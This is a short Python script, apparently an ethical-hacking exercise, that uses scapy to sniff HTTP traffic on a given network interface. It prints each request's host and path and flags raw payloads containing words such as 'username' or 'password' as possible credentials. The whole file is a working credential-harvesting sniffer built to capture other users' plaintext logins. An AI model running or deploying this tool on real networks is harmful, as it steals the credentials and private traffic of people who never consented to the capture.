#!/usr/bin/env python

import scapy.all as scapy 
from scapy.layers import http
import argparse

def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", dest="interface", help="Please specify the interface to sniff packets on")
    options = parser.parse_args()
    if options.interface:
        return options
    else: 
        parser.error("Please specify an interface, use --help for more details")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
def get_url(packet):
    url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    return url

def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load.lower():
                    return load
                    

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request: {url}")
        login_info = get_login_info(packet)
        if login_info: 
            print(f"\n\n[+] Possible Username/Password {login_info}\n\n")
                  


    
sniff(get_args().interface)